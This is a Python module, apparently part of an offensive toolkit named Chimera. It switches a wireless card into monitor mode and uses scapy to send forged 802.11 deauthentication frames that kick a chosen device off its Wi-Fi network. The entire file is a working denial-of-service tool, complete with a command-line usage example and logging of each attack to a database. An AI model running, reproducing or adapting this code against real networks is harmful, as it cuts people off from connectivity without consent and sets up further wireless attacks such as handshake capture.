import sys; sys.path.append('/home/dan/Chimera_Project')
import os
import sys
import time
import subprocess
import logging
from scapy.all import * # pip install scapy

# GPS Line
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../../../')))
from core.db_handler import ChimeraDB

class Wifi_Deauther:
    def __init__(self, interface="wlan0"):
        self.agent_id = "82"
        self.name = "Wifi_Deauther"
        self.db = ChimeraDB()
        self.iface = interface

    def enable_monitor_mode(self):
        """Automates the 'airmon-ng start' process manually."""
        print(f"[*] Preparing hardware: {self.iface}")
        try:
            # 1. Kill interfering processes
            subprocess.run(["sudo", "airmon-ng", "check", "kill"], check=True)
            # 2. Set interface down
            subprocess.run(["sudo", "ip", "link", "set", self.iface, "down"], check=True)
            # 3. Set monitor mode
            subprocess.run(["sudo", "iw", self.iface, "set", "type", "monitor"], check=True)
            # 4. Set interface up
            subprocess.run(["sudo", "ip", "link", "set", self.iface, "up"], check=True)
            print(f"[+] {self.iface} is now in MONITOR MODE.")
            return True
        except Exception as e:
            print(f"[!] Failed to set Monitor Mode: {e}")
            return False

    def deauth(self, target_mac, gateway_mac, count=100):
        """Sends deauthentication packets to kick a target off the network."""
        # Dot11 : IEEE 802.11
        # addr1: Target (Station), addr2: Source (AP), addr3: AP (BSSID)
        # Reason code 7: Class 3 frame received from nonassociated station
        dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
        packet = RadioTap()/dot11/Dot11Deauth(reason=7)

        print(f"[*] Sending {count} deauth packets to {target_mac}...")
        sendp(packet, inter=0.1, count=count, iface=self.iface, verbose=1)
        
        self.db.report_finding(self.name, "Wifi_Deauth_Attack", {
            "target": target_mac,
            "ap": gateway_mac,
            "packets_sent": count
        })

    def run(self, target_mac=None, gateway_mac=None):
        log_path = f"/home/dan/Chimera_Project/logs/{self.name}.log"
        logging.basicConfig(filename=log_path, level=logging.INFO)
        self.logger = logging.getLogger(self.name)
        
        self.db.heartbeat(self.name)
        
        if self.enable_monitor_mode():
            if target_mac and gateway_mac:
                self.deauth(target_mac, gateway_mac)
            else:
                print("[!] No MAC addresses provided. Usage: main.py <target_mac> <ap_mac>")
        
        self.db.close()

if __name__ == "__main__":
    # Example: sudo python3 main.py 00:11:22:33:44:55 AA:BB:CC:DD:EE:FF
    t_mac = sys.argv[1] if len(sys.argv) > 1 else None
    g_mac = sys.argv[2] if len(sys.argv) > 2 else None
    
    agent = Wifi_Deauther()
    agent.run(t_mac, g_mac)
